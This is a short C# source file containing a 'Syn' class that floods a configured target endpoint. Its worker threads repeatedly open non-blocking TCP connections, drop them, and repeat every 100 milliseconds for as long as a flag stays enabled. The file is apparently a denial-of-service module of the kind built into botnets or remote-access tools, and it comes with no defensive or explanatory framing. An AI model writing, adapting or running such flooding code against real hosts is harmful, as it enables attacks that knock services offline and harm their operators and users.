using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;


class Syn
{
    public static bool IsEnabled;
    public static int socketsPerThread = 3;
    public static AsyncCallback callback = new AsyncCallback(OnConnect);
    public static IPEndPoint Host;

    public static void WorkerThread()
    {
        List<Socket> connectionList = new List<Socket>();

        for (int i = 0; i <= socketsPerThread - 1; i++)
        {
            Socket tempClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            tempClient.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.DontLinger, true);
            tempClient.Blocking = false;
            connectionList.Add(tempClient);
        }

        while (IsEnabled)
        {
            for (int i = 0; i <= socketsPerThread - 1; i++)
            {
                try
                {
                    connectionList[i].BeginConnect(Host, callback, connectionList[i]);
                }
                catch
                {
                    if (connectionList[i].Connected)
                    {
                        try
                        {
                            connectionList[i].Disconnect(true);
                        }
                        catch { }
                    }
                }
            }
            Thread.Sleep(100);

            for (int i = 0; i <= socketsPerThread - 1; i++)
            {
                if (connectionList[i].Connected)
                {
                    try
                    {
                        connectionList[i].Disconnect(true);
                    }
                    catch { }
                }
            }
        }
    }

    public static void OnConnect(IAsyncResult ar)
    {
        Socket client = (Socket)ar.AsyncState;

        if (client.Connected)
        {
            try
            {
                client.Disconnect(true);
            }
            catch { }
        }
        GC.Collect();
    }
}